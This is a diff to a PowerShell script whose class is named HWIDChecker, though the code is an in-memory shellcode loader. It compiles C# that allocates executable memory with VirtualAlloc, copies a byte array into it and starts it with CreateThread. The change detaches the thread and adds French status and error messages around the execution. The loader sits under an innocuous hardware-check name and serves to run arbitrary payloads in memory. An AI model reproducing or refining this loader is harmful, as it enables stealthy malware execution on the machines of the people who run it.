@@ -96,7 +96,7 @@ class HWIDChecker {
             $c = New-Object System.CodeDom.Compiler.CompilerParameters
             $c.CompilerOptions = "/unsafe"
             $c.GenerateInMemory = $true
-            $r = $p.CompileAssemblyFromSource($c, 'using System;using System.Runtime.InteropServices;public class X{[DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);[DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr st, IntPtr p, uint f, IntPtr i);[DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint t);public static void E(byte[] b){IntPtr m = VirtualAlloc(IntPtr.Zero, (uint)b.Length, 0x3000, 0x40);Marshal.Copy(b, 0, m, b.Length);IntPtr t = CreateThread(IntPtr.Zero, 0, m, IntPtr.Zero, 0, IntPtr.Zero);WaitForSingleObject(t, 0xFFFFFFFF);}}')
+            $r = $p.CompileAssemblyFromSource($c, 'using System;using System.Runtime.InteropServices;public class X{[DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);[DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr st, IntPtr p, uint f, IntPtr i);[DllImport("kernel32")] static extern bool CloseHandle(IntPtr h);public static void E(byte[] b){IntPtr m = VirtualAlloc(IntPtr.Zero, (uint)b.Length, 0x3000, 0x40);Marshal.Copy(b, 0, m, b.Length);IntPtr t = CreateThread(IntPtr.Zero, 0, m, IntPtr.Zero, 0, IntPtr.Zero);CloseHandle(t);}}')
             if ($r.Errors.Count -gt 0) {
                 Write-Host "ERREUR compilation: $($r.Errors)" -ForegroundColor Red
                 return
@@ -105,8 +105,17 @@ class HWIDChecker {
             $a = $r.CompiledAssembly
             $t = $a.GetType("X")
             $m = $t.GetMethod("E")
-            $m.Invoke($null, @(,$s)) #password
-            Write-Host "Shellcode execute!" -ForegroundColor Green
+            Write-Host "Appel de la methode E avec $($s.Length) bytes de shellcode..." -ForegroundColor Cyan
+            try {
+                $m.Invoke($null, @(,$s)) #password
+                Write-Host "Shellcode execute avec succes!" -ForegroundColor Green
+                Write-Host "L'application devrait maintenant etre lancee. Verifiez dans le gestionnaire de taches." -ForegroundColor Yellow
+            }
+            catch {
+                Write-Host "ERREUR lors de l'execution du shellcode: $($_.Exception.Message)" -ForegroundColor Red
+                Write-Host "Stack: $($_.Exception.StackTrace)" -ForegroundColor Red
+                throw
+            }
         }
         catch {
             Write-Host "ERREUR: $($_.Exception.Message)" -ForegroundColor Red
